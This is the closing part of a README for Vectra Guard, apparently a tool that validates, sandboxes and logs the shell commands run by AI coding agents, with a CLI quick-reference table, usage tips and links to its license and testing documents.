- **[TESTING_SUMMARY.md](TESTING_SUMMARY.md)** - ⭐ NEW! Complete testing guide (95%+ pass rate in Docker)

### Release Information
- **[RELEASE_NOTES_v0.0.1.md](RELEASE_NOTES_v0.0.1.md)** - Current release notes
- **[RELEASE_CHECKLIST_v0.0.1.md](RELEASE_CHECKLIST_v0.0.1.md)** - Release process checklist

---

## 📜 License

Apache License 2.0 - See [LICENSE](LICENSE) for details.

---

## 🌟 Part of VectraHub

Vectra Guard is part of the **VectraHub** ecosystem for secure AI agent development and deployment.

**Repository**: https://github.com/xadnavyaai/vectra-guard

---

## 🎯 Quick Reference

| Task | Command |
|------|---------|
| **Install protection** | `./scripts/install-universal-shell-protection.sh` |
| **Initialize config** | `vectra-guard init` (or `vg init`) |
| **Validate script** | `vg validate script.sh` |
| **Explain risks** | `vg explain script.sh` |
| **Protected execution** | `vg exec -- command` |
| **Override guard level** | `VECTRA_GUARD_LEVEL=low vg exec command` |
| **Start session** | `vg session start --agent NAME` |
| **View session** | `vg session show $SESSION_ID` |
| **List sessions** | `vg session list` |
| **Enable sandbox** | `sandbox: {enabled: true, mode: auto}` |
| **List trusted commands** | `vg trust list` |
| **Trust a command** | `vg trust add "command"` |
| **View metrics** | `vg metrics show` |
| **Sandbox documentation** | See [SANDBOX.md](SANDBOX.md) |
| **Config examples** | See [CONFIGURATION.md](CONFIGURATION.md) |
| **Security testing** | See [SECURITY_TESTING.md](SECURITY_TESTING.md) |
| **Docker testing** | See [DOCKER_TESTING.md](DOCKER_TESTING.md) |
| **Run tests** | `go test ./...` or `./scripts/test-docker.sh` |

---

## 💡 Pro Tips

### General Usage
1. **Use `level: auto`** for intelligent context-aware protection (recommended)
2. **Install universal shell protection** for comprehensive coverage
3. **Configure policies per project** with `vectra-guard.yaml` in repo root
4. **Override when needed**: `VECTRA_GUARD_LEVEL=low vg exec command`
5. **Use the `vg` alias** for faster workflows

### Sandbox Optimization 🚀
6. **Enable caching for 10x speedup**: `sandbox: {enable_cache: true}`
7. **Use developer preset** for best dev experience: `cp presets/developer.yaml vectra-guard.yaml`
8. **Trust common commands** to skip sandbox: `vg trust add "npm test"`
9. **Check metrics weekly** to see time saved: `vg metrics show`
10. **Let cache build organically** - first runs are slower, subsequent runs are 10x faster!

### Security Best Practices
11. **Review session logs regularly** to understand agent behavior
12. **Share configs with team** via git for consistent protection
13. **Teach it your patterns** in `production_indicators` for better detection
14. **Test scripts before committing** with `vg validate script.sh`
15. **Use paranoid mode for production**: `security_level: paranoid`

### Productivity Hacks
16. **Approve and remember** common commands with 'r' option
17. **Use presets** in [CONFIGURATION.md](CONFIGURATION.md) for quick setup
18. **Run `vg metrics show`** to celebrate time saved! 🎉
19. **Clear trust store periodically**: `vg trust clean`
20. **Work offline** - cache has you covered once populated!

---

<div align="center">

**Stay Safe. Code Fearlessly.** 🛡️

[Report Bug](https://github.com/xadnavyaai/vectra-guard/issues) · [Request Feature](https://github.com/xadnavyaai/vectra-guard/issues) · [Documentation](https://github.com/xadnavyaai/vectra-guard)

</div>
